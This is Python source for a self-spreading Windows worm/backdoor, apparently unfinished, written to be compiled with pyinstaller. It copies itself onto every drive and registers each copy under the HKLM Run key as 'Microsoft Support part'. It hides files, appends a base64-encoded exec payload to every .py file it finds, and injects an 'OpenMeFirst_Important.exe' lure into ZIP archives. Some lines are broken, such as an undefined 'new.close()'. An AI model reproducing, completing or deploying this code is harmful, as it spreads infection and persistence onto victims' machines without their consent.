#
#       Note:Most of the functions would be for windows or all of it
#
#       Don't forget to convert it to executable & I recommend to you pyinstaller
#
import os,string,random,sys,glob,hashlib,zipfile
from winreg import *

#Get the drivers on the pc
def drivers():
    drivs = []
    for i in string.ascii_uppercase:
        if os.path.isdir( i+":" ) == True:
            drivs.append( i+":" )
    return drivs

#Return a new random name for a file
def fname(name):
    if "." not in name :
        return name + str(random.randint(0,100))
    elif "." in name :
        return name.split(".")[0] + str(random.randint(0,100)) + "." + name.split(".")[1]

#To make the files check each other from hash not name
#Return MD5 hash of a file
def md5_checksum(fi):
    return hashlib.md5(open(fi, 'rb').read()).hexdigest()

#The script must be executable
#Add each copy of the backdoor to the startup
def Startup(worms):
    for worm in worms:
        hiddenPath = os.getcwd()
        hiddenPath = '\"' + hiddenPath + '\"'
        regPath = os.getcwd()
        regPath = regPath + r"\%s"%worm
        regPath = '\"' + regPath + '\"'
        regConnect = ConnectRegistry(None, HKEY_LOCAL_MACHINE)
        regKey = OpenKey(regConnect, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
        SetValueEx(regKey,"Microsoft Support part "+str(random.randint(0,100)),0, REG_SZ, r"" + regPath)
        #Hide the file
        os.system("attrib +h " + hiddenPath)

#Make a copy of the backdoor
def make_copy( old,new ):
    old_file = open( old,"rb" )
    new_file = open( new,"wb" )
    old_data = old_file.read()
    new_file.write( old_data )
    old_file.close()
    new_file.close()

#For example if we in  C:\.\.\.\..etc I will be in C:
def Goback():
    for i in range( 0,20 ):
        a = os.popen("cd ..")

#The script must be executable
#Spread backdoor copys in the pc drivers
def spread_in_drivers():
    Goback()
    drivs = drivers()
    #current_driver = os.getcwd().split( ":" )[0]
    name = sys.argv[0]
    f = open( name , "rb" )
    data = f.read()
    f.close()
    for driv in drivs:
        exist = 0
        os.chdir( driv )
        #get all the exe files in the folder
        driv_files = glob.glob( "*.exe" )
        for fi in driv_files:
            if md5_checksum( fi ) == md5_checksum( name ):
                exist = 1
        if exist == 0 :
            make_copy( name,fname(name) )

#[when a script moved to any other device and executed it will run our backdoor on it]
#The script must be executable
#Spread in the python scripts
def spread_in_python():
    Goback()
    files = []
    #get all the python files in the machine
    for driv in drivers():
        os.chdir( driv )
        files = os.popen( 'dir /s /b "*.py"' ).read().split( "\n" )
    for f in files:
        if "#--SayTheMagicWord--" not in open( f,"r" ).read() :
            a=open(f,"a+")
            a.write("\n\n\n\n#--SayTheMagicWord--\nimport base64,os;exec(base64.b64decode('{}'))".format(base64.b64encode("open('YourDailyWorm.exe','w').write('{}');os.popen('YourDailyWorm.exe')".format(open(sys.argv[0],'rb').read()))))
            a.close()

#Clean a file data and rewrite it
def replace_file( old_file,data ):
    f = open( old_file,"w" )
    f.write(data)
    f.close()

#The script must be executable
#Spread in ZIP files
def spread_in_zip():
    Goback()
    name = sys.argv[0]
    files = []
    #get all the ZIP files in the machine
    for driv in drivers():
        os.chdir( driv )
        files = os.popen( 'dir /s /b "*.zip"' ).read().split( "\n" )
    for f in files:
        if "OpenMeFirst_Important.exe" not in zipfile.ZipFile(f).namelist():
            #extract the ZIP file to temp folder
            old_zip = zipfile.ZipFile(f)
            old_zip.extractall("temp")
            os.chdir( "temp" )
            #make a self copy
            make_copy( name,"OpenMeFirst_Important.exe" )
            old_zip.close()
            #now make a new ZIP file with the same name
            new_zip = zipfile.ZipFile( os.path.basename(f),"w" )
            #Add all files in temp to the new ZIP
            for fi in os.listdir():
                new_zip.write(fi)
            new.close()
            #Now replace the original one with our copy
            replace_file( f,open( os.path.basename(f) ,"rb").read() )
            #cleanup!
            os.chdir("..")
            os.remove("temp")

#I will Continue later.. ;)
